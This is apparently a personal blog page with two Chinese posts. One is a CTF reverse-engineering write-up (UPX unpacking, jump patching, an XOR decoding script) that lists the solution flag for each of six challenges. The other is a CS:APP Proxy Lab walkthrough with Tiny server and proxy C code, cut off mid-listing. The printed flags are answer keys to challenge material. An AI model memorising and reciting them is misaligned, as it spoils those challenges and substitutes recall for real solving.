<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://secondbc.github.io/SecondBC/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/SecondBC/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/SecondBC/css/style.css">

<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/SecondBC/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/SecondBC/">Home</a>
        
          <a class="main-nav-link" href="/SecondBC/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/SecondBC/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://secondbc.github.io/SecondBC"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-0x41414141" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/SecondBC/2022/10/04/0x41414141/" class="article-date">
  <time datetime="2022-10-04T07:43:43.000Z" itemprop="datePublished">2022-10-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/SecondBC/2022/10/04/0x41414141/">1094795585</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Backupkeys"><a href="#Backupkeys" class="headerlink" title="Backupkeys"></a>Backupkeys</h2><p>Can you recover my backup keys to get the flag , they probably are hardcoded ?</p>
<p>提示说明 flag 是硬编码；</p>
<p>进入IDA只有start和零散的几个函数，说明加壳了；</p>
<p>用16进制查看器搜UPX可以发现 UPX! 标志；</p>
<p>脱壳后看main函数：</p>
<p><img src="https://s2.loli.net/2022/10/03/CSgXzEMV4Z1LjYD.png" alt="main"></p>
<p>在最下方的输出 try harder的另一条线上有一个输出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;Phew Phew collect the keys below , don&#x27;t forget to put them in flag&#123;&#125; format&quot;</span></span><br></pre></td></tr></table></figure>

<p>消除逗号得到硬编码的flag：<strong>flag{Hardcodedpasswordsareuseless}</strong></p>
<h2 id="X-and-or"><a href="#X-and-or" class="headerlink" title="X-and-or"></a>X-and-or</h2><p>查看main：</p>
<p><img src="https://s2.loli.net/2022/10/03/9Ty1V4DXIGBQqm3.png" alt="main"></p>
<p>code是一个运行后设置的地址，跳转到主要函数；从code里的判断可得知，输入长度为38；进入运算后循环38次，内部有固定数字进行异或运算并与输入内容比较；</p>
<p><img src="https://s2.loli.net/2022/10/03/nhFodMJmyUXiKzI.png" alt="code"></p>
<p>循环的结尾是比较数据，需要使得eax最终为0；经过调试可以发现每次异或0~5的立方，满6归0；</p>
<p>写出脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">origin = [<span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x69</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x48</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x3E</span>, <span class="number">0x28</span>, <span class="number">0x77</span>, <span class="number">0x19</span>, <span class="number">0x63</span>, <span class="number">0x31</span>, <span class="number">0x6C</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0x63</span>, <span class="number">0x3D</span>, <span class="number">0x7D</span>, <span class="number">0x26</span>, <span class="number">0x4E</span>, <span class="number">0x37</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x2B</span>, <span class="number">0x23</span>, <span class="number">0x1C</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x6A</span>, <span class="number">0x29</span>, <span class="number">0x74</span>, <span class="number">0x1B</span>, <span class="number">0x62</span>, <span class="number">0x7C</span>]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">38</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(((k*k*k)) ^ origin[i])</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">6</span>:</span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure>

<p>由此得到flag：<strong>flag{560637dc0dcd33b5ff37880ca10b24fb}</strong></p>
<p>这题最有意思的是init函数，他把code的二进制内容异或上了0x42，需要将其变回来则再异或0x42，然后写在新的txt里，用IDA反编译，设置sp值，然后就能看到伪代码了：</p>
<p><img src="https://s2.loli.net/2022/10/03/aeJj91hNIT2ozlP.png" alt="code"></p>
<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p>I received a corrupted program the keys are probably lost within the game can you just find it for me to get the flag?.</p>
<p>Flag format : flag{key1+key2}</p>
<p>一开始看main觉得很奇怪，明明汇编有其他分支为什么伪代码始终显示的是 oops wrong path ？</p>
<p>结果发现是因为跳转的地方动了手脚：</p>
<p><img src="https://s2.loli.net/2022/10/03/GpBMo9VZQwleg6J.png" alt="jmp"></p>
<p>它始终都是判断必走另一条路，所以找不到正确的上下文；本来以为很难的题一下就变成了渣渣题；</p>
<p>里里外外都改一下jmp，再运行一遍，它就自己吐flag了；</p>
<p>得出：<strong>flag{456789JKLq59U1337}</strong></p>
<h2 id="Cage"><a href="#Cage" class="headerlink" title="Cage"></a>Cage</h2><p>Are you aware of the scopes yet?</p>
<p>开场patch main_one函数得到正确的上下文；</p>
<p><img src="https://s2.loli.net/2022/10/04/SprgcPE8LWuNDdn.png" alt="main"></p>
<p>发现需要输入一系列magic code，然后它会吐出已有的字符串，直接将字符串拼起来得到flag：</p>
<p><strong>flag{0xm4tr1xreal}</strong></p>
<h2 id="Ware"><a href="#Ware" class="headerlink" title="Ware"></a>Ware</h2><p>My plaintext has been encrypted by an innocent friend of mine while playing around cryptographic libraries, can you help me to recover the plaintext , remembers it’s just numbers and there’s a space between some numbers which you need to remove the space and submit the recovered plain text as a flag.</p>
<p>开始一个upx直接脱掉；</p>
<p>搜索运行时的字符串得到flag：<strong>flag{32117406899806798980909}</strong></p>
<h2 id="WrongDownload"><a href="#WrongDownload" class="headerlink" title="WrongDownload"></a>WrongDownload</h2><p>My key has been missing inside these two binaries can you help me to find it out ,as per my friend the key is divided in two parts between the two binaries so, remember you need to join them up before submitting as a flag.</p>
<p>直接反编译就能找到：<strong>flag{S6c56bnXQiBjk9mqSYE7ykVQ7NzrRy}</strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://secondbc.github.io/SecondBC/2022/10/04/0x41414141/" data-id="cl8twbcpw0000xwvcdwyy2nl1" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Proxy-lab" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/SecondBC/2022/10/01/Proxy-lab/" class="article-date">
  <time datetime="2022-10-01T06:45:29.000Z" itemprop="datePublished">2022-10-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/SecondBC/2022/10/01/Proxy-lab/">Proxy_lab</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>一个web代理，并有多线程和缓存功能，所以一一来实现；</p>
<ul>
<li>根据 write up 中所说，首先需要实现 HTTP/1.0 GET 请求的顺序代理：读取整个请求并解析请求（<strong>是否是有效HTTP请求</strong>），如果是则建立自己到适当 web服务器的连接，请求客户端指定对象，再将响应转发回客户端；注意：HTTP请求每行以\r\n结束，并以\r\n为尾行；<ul>
<li>具体要做到将url解析为三部分：host，后半url，HTTP版本；</li>
<li>请求头中包含ua，host，connection，proxy-connection；</li>
<li>请求端口无论在url中还是默认的都必须正确；</li>
<li>处理过早关闭的连接，需要捕获SIGPIPE；</li>
</ul>
</li>
<li>实现多线程工作（生产者-消费者）；</li>
<li>实现缓存最近内存中使用的web对象（LRU策略）；<ul>
<li>设置缓存的最大内存，以及单个对象的最大内存；</li>
</ul>
</li>
</ul>
<p>handout给出了tiny服务器的源码，只需要在这个基础上进行改装；</p>
<h2 id="Tiny解析"><a href="#Tiny解析" class="headerlink" title="Tiny解析"></a>Tiny解析</h2><p>main函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//输入端口参数</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//监听描述符</span></span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">    <span class="comment">//接受请求成为描述符</span></span><br><span class="line">	connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); </span><br><span class="line">        <span class="comment">//读取套接字信息，IP和端口</span></span><br><span class="line">        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="line">                    port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);</span><br><span class="line">    <span class="comment">//响应</span></span><br><span class="line">	doit(connfd); </span><br><span class="line">    <span class="comment">//关闭接受描述符</span></span><br><span class="line">	Close(connfd);                                            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>doit函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> fd)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> is_static;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sbuf</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> filename[MAXLINE], cgiargs[MAXLINE];</span><br><span class="line">    <span class="keyword">rio_t</span> rio;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取请求行</span></span><br><span class="line">    Rio_readinitb(&amp;rio, fd);</span><br><span class="line">    <span class="keyword">if</span> (!Rio_readlineb(&amp;rio, buf, MAXLINE))  </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);       <span class="comment">//解析请求行</span></span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>)) &#123;                     <span class="comment">//是否为GET请求</span></span><br><span class="line">        clienterror(fd, method, <span class="string">&quot;501&quot;</span>, <span class="string">&quot;Not Implemented&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Tiny does not implement this method&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;                                                    </span><br><span class="line">    read_requesthdrs(&amp;rio);    <span class="comment">//显示请求行和头（printf）                          </span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    is_static = parse_uri(uri, filename, cgiargs);      <span class="comment">//解析uri</span></span><br><span class="line">    <span class="keyword">if</span> (stat(filename, &amp;sbuf) &lt; <span class="number">0</span>) &#123;                    </span><br><span class="line">	clienterror(fd, filename, <span class="string">&quot;404&quot;</span>, <span class="string">&quot;Not found&quot;</span>,</span><br><span class="line">		    <span class="string">&quot;Tiny couldn&#x27;t find this file&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">    &#125;                                                    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_static) &#123;       </span><br><span class="line">	<span class="keyword">if</span> (!(S_ISREG(sbuf.st_mode)) || !(S_IRUSR &amp; sbuf.st_mode)) &#123; </span><br><span class="line">	    clienterror(fd, filename, <span class="string">&quot;403&quot;</span>, <span class="string">&quot;Forbidden&quot;</span>,</span><br><span class="line">			<span class="string">&quot;Tiny couldn&#x27;t read the file&quot;</span>);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	serve_static(fd, filename, sbuf.st_size);        <span class="comment">//静态</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">	<span class="keyword">if</span> (!(S_ISREG(sbuf.st_mode)) || !(S_IXUSR &amp; sbuf.st_mode)) &#123; </span><br><span class="line">	    clienterror(fd, filename, <span class="string">&quot;403&quot;</span>, <span class="string">&quot;Forbidden&quot;</span>,</span><br><span class="line">			<span class="string">&quot;Tiny couldn&#x27;t run the CGI program&quot;</span>);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	serve_dynamic(fd, filename, cgiargs);            <span class="comment">//动态</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>serve_static函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">serve_static</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *filename, <span class="keyword">int</span> filesize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> srcfd;</span><br><span class="line">    <span class="keyword">char</span> *srcp, filetype[MAXLINE], buf[MAXBUF];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//发送响应行和报头</span></span><br><span class="line">    get_filetype(filename, filetype);    </span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>); </span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Server: Tiny Web Server\r\n&quot;</span>);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Content-length: %d\r\n&quot;</span>, filesize);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Content-type: %s\r\n\r\n&quot;</span>, filetype);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//回响载体</span></span><br><span class="line">    srcfd = Open(filename, O_RDONLY, <span class="number">0</span>); </span><br><span class="line">    srcp = Mmap(<span class="number">0</span>, filesize, PROT_READ, MAP_PRIVATE, srcfd, <span class="number">0</span>); <span class="comment">//映射内存保证原文件纯净</span></span><br><span class="line">    Close(srcfd);                       </span><br><span class="line">    Rio_writen(fd, srcp, filesize);     </span><br><span class="line">    Munmap(srcp, filesize);             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>serve_dynamic函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">serve_dynamic</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *filename, <span class="keyword">char</span> *cgiargs)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], *emptylist[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//行与报头</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>); </span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Server: Tiny Web Server\r\n&quot;</span>);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">  </span><br><span class="line">    <span class="comment">//子进程</span></span><br><span class="line">    <span class="keyword">if</span> (Fork() == <span class="number">0</span>) &#123;</span><br><span class="line">	</span><br><span class="line">	setenv(<span class="string">&quot;QUERY_STRING&quot;</span>, cgiargs, <span class="number">1</span>);  <span class="comment">//用url参数初始化环境变量</span></span><br><span class="line">	Dup2(fd, STDOUT_FILENO);        <span class="comment">//重定向输出到fd</span></span><br><span class="line">	Execve(filename, emptylist, environ);  <span class="comment">//运行CGI程序</span></span><br><span class="line">    &#125;</span><br><span class="line">    Wait(<span class="literal">NULL</span>); <span class="comment">//等待子进程结束回收</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="I-顺序代理GET请求"><a href="#I-顺序代理GET请求" class="headerlink" title="I . 顺序代理GET请求"></a>I . 顺序代理GET请求</h2><p>writeup中的要求：</p>
<ol>
<li><p>处理 HTTP/1.0 版本，如果遇到1.1，则需要将其作为1.0版本转发；</p>
</li>
<li><p>转发合法 HTTP 请求（实现中所示）；</p>
</li>
<li><p>头中的 ua 和 两个 connection 都有给定的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305Firefox/10.0.3\r\n&quot;</span></span><br><span class="line"><span class="string">&quot;Proxy-Connection: close&quot;</span> </span><br><span class="line"><span class="string">&quot;Connection: close&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>​    </li>
</ul>
<p>实际上要做的，就是将doit内的操作变为转发与回复，而不是单纯回响；</p>
<p>那么需要将发送的包<strong>改</strong>写给目标服务器，之后把目标服务器的回响写给发送者；</p>
<p>要看uri中是否有端口那就应该解析uri，但和上面解析是不一样的，上面是在看读取的文件是静态还是动态；</p>
<p>主函数和tiny一样，只是需要在 listen之前加一条：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signal(SIGPIPE,SIG_IGN);</span><br></pre></td></tr></table></figure>

<p>新建三个全局变量：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//uri解析记录变量</span></span><br><span class="line"><span class="keyword">char</span> send_port[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> send_host[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> send_path[MAXLINE];</span><br></pre></td></tr></table></figure>

<p>doit：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> fd)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> backbuf[MAXLINE],newhd[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> *send;</span><br><span class="line">    <span class="keyword">rio_t</span> rio,serverfd_rio;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取请求行</span></span><br><span class="line">    Rio_readinitb(&amp;rio, fd);</span><br><span class="line">    <span class="keyword">if</span> (!Rio_readlineb(&amp;rio, buf, MAXLINE))  </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);       <span class="comment">//解析请求行</span></span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>)) &#123;                     <span class="comment">//是否为GET请求</span></span><br><span class="line">        clienterror(fd, method, <span class="string">&quot;501&quot;</span>, <span class="string">&quot;Not Implemented&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Tiny does not implement this method&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;                                                    </span><br><span class="line">    read_requesthdrs(&amp;rio);    <span class="comment">//显示请求行和头（printf）                          </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//解析uri为host port path</span></span><br><span class="line">    parse_uri(uri);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//改写</span></span><br><span class="line">    <span class="built_in">sprintf</span>(newhd, <span class="string">&quot;GET %s HTTP/1.0\r\n&quot;</span>, send_path);</span><br><span class="line">    send = built_message(newhd,&amp;rio);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//开启远程服务器</span></span><br><span class="line">    <span class="keyword">int</span> serverfd = Open_clientfd(send_host,send_port);</span><br><span class="line">    <span class="keyword">if</span> (serverfd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connection failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    Rio_readinitb(&amp;serverfd_rio, serverfd);</span><br><span class="line">    <span class="comment">//写入服务器</span></span><br><span class="line">    Rio_writen(serverfd, send, <span class="built_in">strlen</span>(send));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//回响</span></span><br><span class="line">    <span class="keyword">while</span>((n = Rio_readlineb(&amp;serverfd_rio,backbuf,MAXLINE)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;proxy received %d bytes,then send\n&quot;</span>, (<span class="keyword">int</span>)n);</span><br><span class="line">        Rio_writen(fd,backbuf,n);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Close (serverfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个神奇函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 